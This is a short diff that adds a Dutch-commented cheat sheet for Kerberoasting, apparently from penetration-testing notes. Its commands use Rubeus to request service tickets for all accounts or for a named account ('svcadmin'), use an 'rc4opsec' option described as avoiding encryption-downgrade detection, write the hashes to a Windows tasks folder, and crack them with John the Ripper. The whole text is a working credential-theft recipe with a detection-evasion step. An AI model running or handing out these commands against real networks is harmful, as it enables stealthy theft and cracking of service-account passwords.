@@ -1,0 +1,10 @@
+# Kerberoast - Service account wachtwoorden kraken
+# Stats bekijken:
+.\Rubeus.exe kerberoast /stats
+# Specifieke user:
+.\Rubeus.exe kerberoast /user:svcadmin /simple
+# RC4 opsec (vermijd encryption downgrade detectie):
+.\Rubeus.exe kerberoast /stats /rc4opsec
+.\Rubeus.exe kerberoast /rc4opsec /outfile:C:\Windows\tasks\hashes.txt
+# Kraken met John:
+john.exe --wordlist=wordlist.txt hashes.txt
